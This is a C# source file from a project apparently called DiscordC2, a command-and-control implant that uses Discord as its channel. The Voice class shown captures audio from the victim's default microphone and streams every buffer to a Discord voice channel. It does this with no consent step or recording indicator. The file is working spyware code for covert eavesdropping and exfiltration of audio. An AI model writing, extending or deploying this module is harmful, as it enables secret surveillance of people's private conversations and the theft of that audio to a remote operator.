using Discord.Audio;
using NAudio.Wave;

namespace DiscordC2.Common
{
    public static class Voice 
    {
        private static WaveInEvent? sourceStream;
        public static WaveFormat waveFormat = new WaveFormat(48000, 2);
        public static AudioOutStream discordStream;

        private static void sourceStream_DataAvailable(object sender, WaveInEventArgs e) {
            try 
            {
                discordStream.Write(e.Buffer, 0, e.BytesRecorded); // race condition here when attempting to dispose of discordStream
            } 
            catch 
            {
                Console.WriteLine("Error writing to discord stream");
                return;
            }
        }
        private static void sourceStream_RecordingStopped(object sender, StoppedEventArgs e) {
            sourceStream.Dispose();
        }
        public static void GetAudioStream(AudioOutStream discordStream)
        {
            sourceStream = new WaveInEvent
            {
                DeviceNumber = 0,
                WaveFormat = waveFormat,
            };
            Voice.discordStream = discordStream;
            sourceStream.DataAvailable += new EventHandler<WaveInEventArgs>(sourceStream_DataAvailable);
            sourceStream.RecordingStopped += new EventHandler<StoppedEventArgs>(sourceStream_RecordingStopped); 
            sourceStream.StartRecording();

            return;
        }

        public static void StopAudioStream()
        {
            if (sourceStream != null){
                sourceStream.StopRecording();
            }
            
            // causes race condition
            // if (discordStream != null)
            // {
            //     discordStream.Flush();
            //     discordStream.Dispose();
            // }

            
                
            return;
        }
    }
}